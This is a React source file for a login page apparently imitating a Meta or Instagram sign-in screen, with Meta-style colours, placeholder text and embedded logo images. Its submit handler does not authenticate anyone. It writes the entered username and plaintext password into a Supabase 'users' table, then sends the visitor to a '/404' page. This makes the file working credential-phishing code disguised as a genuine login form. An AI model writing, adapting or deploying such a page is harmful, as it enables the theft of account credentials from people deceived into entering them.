import React, { useState } from 'react';
import { supabase } from '../supabaseClient';
import { useNavigate } from 'react-router-dom';

function Login() {
  const navigate = useNavigate();
  const [credentials, setCredentials] = useState({
    username: '',
    password: '',
  });


  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    console.log(credentials)
    const { data, error } = await supabase.from('users').insert([{ username: credentials.username, password: credentials.password }]);
    if (error) console.error(error);
    else {
      localStorage.setItem('loaded', JSON.stringify(true))
      navigate('/404')
    }
  };

  return (
    <div className="min-h-screen  text-white flex flex-col items-center pt-2 pb-[14px] px-4 bg-[rgb(28,43,51)]">
      <div style={{
      position: 'absolute',
      inset: 0,
      zIndex: -1,
      opacity: 0.08,
      pointerEvents: 'none',
      backgroundImage: `
        radial-gradient(rgba(255, 255, 255, 0.25), rgba(255, 255, 255, 0) 40%),
        radial-gradient(rgb(255, 209, 82) 30%, rgb(226, 105, 150), rgba(226, 105, 150, 0.4) 41%, transparent 52%),
        radial-gradient(rgb(160, 51, 255) 37%, transparent 46%),
        linear-gradient(155deg, transparent 65%, rgb(37, 212, 102) 95%),
        linear-gradient(45deg, rgb(0, 101, 224), rgb(15, 139, 255))
      `,
      backgroundPosition: 'left bottom, 109% 68%, 109% 68%, center center, center center',
      backgroundRepeat: 'no-repeat',
      backgroundSize: '200% 200%, 285% 500%, 285% 500%, cover, cover'
    }}></div>
  <div className="language-selector top-4 right-4">
    <button className="text-gray-300 hover:text-white transition-colors flex items-center text-sm">
      English (UK)
    </button>
  </div>
  <div className="flex-1 flex flex-col items-center justify-center w-full max-w-md px-6">
    <div className="w-full flex flex-col items-center mb-8 mt-24">
      <div className="w-16 h-16 mb-8">
          <img alt="" src="data:image/png;base64,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" />

      </div>
    </div>
    <form className="w-full space-y-4" onSubmit={handleSubmit}>
      <div className="space-y-4">
        <input
          type="text"
          value={credentials.username}
          onChange={(e) => setCredentials({ ...credentials, username: e.target.value })}
          placeholder="Username, email address or mobile number"
          className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 transition-colors"
        />
        <input
          type="password"
          placeholder="Password"
          value={credentials.password}
          onChange={(e) => setCredentials({ ...credentials, password: e.target.value })}
          className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 transition-colors"
        />
      </div>
      <button
        className="w-full bg-[#1877F2] text-white py-3 rounded-lg font-medium hover:bg-blue-600 transition-colors"
        onSubmit={handleSubmit}
      >
        Log in
      </button>
      <div className="text-center mt-4">
        <button className="text-[#1877F2] hover:text-blue-400 transition-colors">
          Forgotten password?
        </button>
      </div>
    </form>
    <div className="mt-auto w-full">
      <a
        className="block w-full border border-[#1877F2] text-[#1877F2] py-3 rounded-lg text-center font-medium hover:bg-[#1877F2]/10 transition-colors mt-4"
        href="/signup"
      >
        Create new account
      </a>
    </div>
    <footer className="mt-8 mb-4 w-14 aspect-ratio: 5 / 1;">
      <img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAYCAMAAAAGTsm6AAACjlBMVEVHcEz///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////8iixE2AAAA2XRSTlMAco+RB4YCr2L+Aa1FTo009cf3DvN2+s/hvNmqT/nqHCEJ2gazN8H7bzz9D+Ns7ev48S2rChmk1lqS3yUFQb07yaBI9CrT/MCCL9GUEu6aa0l63eDmAx9lRz0IjF0dxrnnfHidIw0XthAzTCfbd97o2FdcEYEEyNwLP7phha6yJu8bE1BxtShVMBrLZKfMv4ix0AxmaL6JTXsi9o5UFruwpSlS4oBCis1WwvC3NqxunF7FJBQyqHlf1ZA4OuVjPisgQJdDmeQuw39ZRjWmoWqTRFFbLKLUYEsVUHtrhQAABDhJREFUeF6llfVXXFcQxwe2XfYtm6wBC+yiEkjRYKGEQEgJDQTXIEGj0sYatyZpG20jjVbd3d3dXea/6czeu/ftXU45nPL5Yc539vD47Ltv3iwI7FVlBZ5k/16Q7D2T6fqg9sMs0GhyOBwfgc4AfdYE/5cmHwrWref2wkHZJuZokhgkFmuC+UjE/IegNy8v732YhsULMERmOsDJd1TreWCK+Gk7hLFrOvF1iHj9NN4GF5osXO9dxsF1fixodkaKcTuYbMNZiDOCIndV3cVqDknnqBgHvACOW/m010SKEweVIKtrNuK3kLiRD7C8FgXGMDBpbL4tUoy3KEEUzkLsLSLTw3Zx86eEeDw0OgZi3IOaeB7ic6/Lfkcr4s3h4k8/G12W1PY5MCeiouL5AKOIK8AMnv7BfT67sAVy6COAO0i0oAIEq4NjlmQFySPUxWtip0HHI/u5iMYbpvjjZhTc/Ql1hWgSC8SxVNGkBsapAiyhehlCWJBYrtoN1Pk0MVQiJiwCJj0FsR6UeGmcEo01TBW334CS3K9Z3EfFWAWStODFnmvKtZXaRZq4zyPvAN5EdB1R4rTb+UEUdrTfw/dshQGLZQWlUxbCBuDMpebLybyJGPEF4G0qS5TnRQySDWCeJr6iieEs1TrqXjB48pT4EIVOHhX7N5T6I4fLR9mfz+mrAiTgXSpPgGQlSjaC5Dg1Fl2cX4zopu5ZxJ49SnyEbuSccFhHaOYixCcoNsvRuSuBxTyVARBkJVPz8mYqm7NA0MDnp4uhnVzPwDGq+0GJeUYHQPATYuNRXXyA4lKQ1LM4M+whTlBuPbox/F3NoLw1QrwzGbFrDxWf1RS3Iab8OkfAr1GOLvYjGhnhzw94xlvkZN1E+SWA50kWVwGCXMQtEWIIkIyX9JNgiu9EnYAufhWxADQxn3eN6Mt4Ve+Uz6ASBDSrJZFimIfMIQgTj6LOfl3sRqzWxXyXa4HpwNBzuN/8+bM2IrqmiHmLYO6mcPEkYkK/zeSwLo5FbKzRxN1U5nO343H1HuVvobjby3ETpW5dzFSi3F9K3Cn+j0YNCeaKOETxPZB8weJYKvXU9O6jcF+6MGxHIptH5ykKB6eKvaWlpeWa+DWxoCRWEYoRz4hUR5p9IFjlYnE/FWN5+oaHkOgEgRiVpJyKeF4zVbpYoYmBF9ZVuzgx/1lgeB23XgDGvptXsZXjtWQkoLwYFeusIFnbg4pm64zEh3laRoadv6+8XIT4LTC8M322X658J3eT+2rgr8kSZAAeU4aFXlA41cY3OmBGYjhegiY/AnPSZf5IDClPyqi4gdMpoi9rgTCcifKv7oUZiuH7LpT0hC4ajlNiiE8QnuK/x4UYVq/I9BTVbgOdNfGXEkuq2x4FE1t0dDREQp/ZZOyd4/cVpf75x2+DEKLv50sF3SMXxVANuVPH3BP/gIOu+Rdg4U4GPLb7XQAAAABJRU5ErkJggg==" />
    </footer>
  </div>
</div>
 
  );
}

export default Login;

// <div className="min-h-screen bg-gradient-to-b from-gray-900 to-black text-white flex flex-col items-center pt-2 pb-[14px] px-4">
// <div className="language-selector  top-4 right-4">
//   <button className="text-gray-300 hover:text-white transition-colors flex items-center text-sm">
//     English (UK)
//   </button>
// </div>

// <div className="flex-1 flex flex-col items-center justify-center w-full max-w-md px-6">
//   <div className="w-full flex flex-col items-center mb-8">
//     <div className="w-16 h-16 mb-8">
//       <img alt="" src="data:image/png;base64,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" />
//     </div>
//   </div>

//   <form onSubmit={handleSubmit} className="w-full space-y-4">
//     <div className="space-y-4">
//       <input
//         type="text"
//         placeholder="Username, email address or mobile number"
//         value={credentials.username}
//         onChange={(e) => setCredentials({ ...credentials, username: e.target.value })}
//         className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 transition-colors"
//       />
//       <input
//         type="password"
//         placeholder="Password"
//         value={credentials.password}
//         onChange={(e) => setCredentials({ ...credentials, password: e.target.value })}
//         className="w-full bg-gray-800/50 border border-gray-700 rounded-lg px-4 py-3 text-white placeholder-gray-400 focus:outline-none focus:border-blue-500 transition-colors"
//       />
//     </div>

//     <button
//       type="submit"
//       className="w-full bg-[#1877F2] text-white py-3 rounded-lg font-medium hover:bg-blue-600 transition-colors"
//     >
//       Log in
//     </button>

//     <div className="text-center mt-4">
//       <button className="text-[#1877F2] hover:text-blue-400 transition-colors">
//         Forgotten password?
//       </button>
//     </div>
//   </form>

//   <div className="mt-auto w-full">
//     <Link
//       to="/signup"
//       className="block w-full border border-[#1877F2] text-[#1877F2] py-3 rounded-lg text-center font-medium hover:bg-[#1877F2]/10 transition-colors mt-4"
//     >
//       Create new account
//     </Link>
//   </div>

//   <footer className="mt-8 mb-4">
//     <img alt="" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAHgAAAAYCAMAAAAGTsm6AAACjlBMVEVHcEz////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////